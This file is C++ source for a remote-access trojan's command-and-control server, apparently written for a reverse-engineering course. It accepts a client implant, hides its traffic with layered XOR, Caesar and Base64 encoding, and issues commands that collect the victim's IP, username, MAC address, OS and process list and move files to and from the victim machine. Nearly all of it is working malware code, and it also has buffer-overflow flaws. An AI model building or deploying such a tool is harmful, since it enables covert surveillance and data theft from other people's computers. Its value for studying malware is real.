#include <stdio.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string>
#include <sys/socket.h>
#include <sys/types.h>
#include <iostream>
#include <errno.h>
#include <unistd.h> // read(), write(), close()
#include <string>
#include <cctype>
#include <vector>
#include <cmath>
#define MAX 80
#define PORT 8080
#define SA struct sockaddr

using namespace std;

// Caesar Cipher
int caesar_shift = 3;

// XOR Encryption
std::string key1 = "csec476";
std::string key2 = "reversingproject";

// Base64 characters
static const std::string BASE64_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

// Encode functions ...
std::string xor_encrypt(const std::string &input, const std::string &key) {
    std::string output;
    output.resize(input.size());
    for (size_t i = 0; i < input.size(); ++i) {
        output[i] = input[i] ^ key[i % key.size()];
    }
    return output;
}

std::string caesar_encrypt(const std::string &input) {
    std::string output;
    output.resize(input.size());
    for (size_t i = 0; i < input.size(); ++i) {
        if (isalpha(input[i])) {
            int offset = isupper(input[i]) ? 'A' : 'a';
            output[i] = (input[i] - offset + caesar_shift) % 26 + offset;
        } else {
            output[i] = input[i];
        }
    }
    return output;
}

std::string caesar_decrypt(const std::string &input) {
    std::string output;
    output.resize(input.size());
    for (size_t i = 0; i < input.size(); ++i) {
        if (isalpha(input[i])) {
            int offset = isupper(input[i]) ? 'A' : 'a';
            output[i] = (input[i] - offset - caesar_shift + 26) % 26 + offset;
        } else {
            output[i] = input[i];
        }
    }
    return output;
}

std::string base64_encode(const std::string &input) {
    std::string output;
    int val = 0;
    int valb = -6;
    for (unsigned char c : input) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            output.push_back(BASE64_CHARS[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) {
        output.push_back(BASE64_CHARS[((val << 8) >> (valb + 8)) & 0x3F]);
    }
    while (output.size() % 4) {
        output.push_back('=');
    }
    return output;
}

std::string base64_decode(const std::string &input) {
    std::string output;
    std::vector<int> T(256, -1);
    for (size_t i = 0; i < BASE64_CHARS.size(); i++) {
        T[BASE64_CHARS[i]] = i;
    }

    int val = 0;
    int valb = -8;
    for (unsigned char c : input) {
        if (T[c] == -1) {
            break;
        }
        val = (val << 6) + T[c];
        valb += 6;
        if (valb >= 0) {
            output.push_back(static_cast<char>((val >> valb) & 0xFF));
            valb -= 8;
        }
    }
    return output;
}

// Encode Decode Comb
std::string encrypt(const std::string &input) {
    // Step 1: XOR
    std::string xor_encrypted = xor_encrypt(input, key1);

    // Step 2: Caesar Cipher
    std::string caesar_encrypted = caesar_encrypt(xor_encrypted);

    // Step 3: Base64
    std::string base64_encoded = base64_encode(caesar_encrypted);

    // Step 4: XOR again
    std::string final_encrypted = xor_encrypt(base64_encoded, key2);

    return final_encrypted;
}

std::string decrypt(const std::string &input) {
    // Step 1: XOR
    std::string xor_decrypted = xor_encrypt(input, key2);

    // Step 2: Base64
    std::string base64_decoded = base64_decode(xor_decrypted);

    // Step 3: Caesar Cipher
    std::string caesar_decrypted = caesar_decrypt(base64_decoded);

    // Step 4: XOR again
    std::string final_decrypted = xor_encrypt(caesar_decrypted, key1);

    return final_decrypted;
}
   
// Function designed for chat between client and server.
int func(int connfd)
{
    char buff[MAX];
    int n;
    char filename[20];
    // infinite loop for chat
    for (;;) {
        bzero(buff, MAX);
        cout << "Command for client : " << endl;
        n = 0;
        // copy server message in the buffer
        while ((buff[n++] = getchar()) != '\n')
            ;

        if (strstr(buff, "upload")) {
            char* token = strtok(buff, " ");
            token = strtok(NULL, " ");
            strcpy(filename, token);
            filename[strlen(filename)-1] = '\0';
        }

        string encryptedBuff = encrypt(string(buff));
        strncpy(buff, encryptedBuff.c_str(), encryptedBuff.size());
        buff[encryptedBuff.size()] = '\0';

        // and send that buffer to client
        send(connfd, buff, sizeof(buff), 0); // buff might be too small for files

        // read the message from client and copy it in buffer
        recv(connfd, buff, sizeof(buff), 0);

        string decryptedBuff = decrypt(string(buff));
        strncpy(buff, decryptedBuff.c_str(), decryptedBuff.size());
        buff[decryptedBuff.size()] = '\0';

        if (strstr(buff, "download")) {
            char* token = strtok(buff, " ");
            token = strtok(NULL, " ");
            char downloadFile[20];
            strcpy(downloadFile, token);
            downloadFile[strlen(downloadFile)-1] = '\0';
            strcpy(downloadFile, token);
            downloadFile[strlen(downloadFile)-1] = '\0';
            FILE* file;
            if ((file = fopen(downloadFile, "r")) == NULL) {
                cout << "File Not Found on Server!\n" << endl;
                return 0;
            }
            fseek(file, 0, SEEK_END);
            long len = ftell(file);
            fseek(file, 0, SEEK_SET);
            bzero(buff, MAX);
            // char fileContents[len];
            fread(buff, 1, len, file);
            fclose(file);

            string encryptedFileContents = encrypt(string(buff));
            strncpy(buff, encryptedFileContents.c_str(), encryptedFileContents.size());
            buff[encryptedFileContents.size()] = '\0';
            send(connfd, buff, sizeof(buff), 0); // buff might be too small for files
        }

        // get file contents to new file 
        // if the given command is download, the server should receive only the file's
        // content from the client and will send the command to the client as received
        // from the user on the server.
        if (strlen(filename) != 0) {
            FILE * file;
            if ((file = fopen(filename, "w")) == NULL) {
                cout << "unable to create file on server!\n" << endl;
                return 0;
            }
            fputs(buff, file);
            fclose(file);
        }

        // print buffer which contains the client contents
        cout << "Client's response:\n" << buff << endl;
        bzero(buff, MAX);

        // if msg contains "Exit" then server exit and chat ended.
        if (strncmp("exit", buff, 4) == 0) {
            cout << "Server Exit...\n" << endl;
            break;
        }
    }
    return 0;
}

// Driver function
int main()
{
    int sockfd, connfd, len;
    struct sockaddr_in servaddr, cli;
   
    // socket create and verification
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        cout << "socket creation failed...\n" << endl;
        return 0;
    }
    else
        cout << "Socket successfully created..\n" << endl;
    bzero(&servaddr, sizeof(servaddr));
   
    // assign IP, PORT
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
    servaddr.sin_port = htons(PORT);
   
    // Binding newly created socket to given IP and verification
    if ((bind(sockfd, (SA*)&servaddr, sizeof(servaddr))) != 0) {
        cout << "socket bind failed...\n" << endl;
        return 0;
    }
    else
        cout << "Socket successfully binded..\n" << endl;
   
    // Now server is ready to listen and verification
    if ((listen(sockfd, 5)) != 0) {
        cout << "Listen failed...\n" << endl;
        return 0;
    }
    else
        cout << "Server listening..\n" << endl;
    len = sizeof(cli);
   
    socklen_t peeraddr_len;

    // Accept the data packet from client and verification
    connfd = accept(sockfd, (SA*)&cli, &peeraddr_len);
    if (connfd < 0) {
        cout << "server accept failed...\n" << endl;
        return 0;
    }
    else
        cout << "server accept the client...\n" << endl;
   
    cout << "\nInformation to get from client:\n\tIPAddress : this will gather the client's IP Addess\n\t"
            "Username : this will gather the client's username\n\tMacAddress : this will gather the client's" 
            "MAC Address\n\tOS : this will gather the client's Operating System\n\tprocesses : this will"
            "list out the client's running processes\n\tupload <file path> : this will upload a file to the"
            "client\n\tdownload <file path> : this will download a file from the client\n\n" << endl;
    // Function for chatting between client and server
    func(connfd);
   
    // After chatting close the socket
    close(sockfd);
}
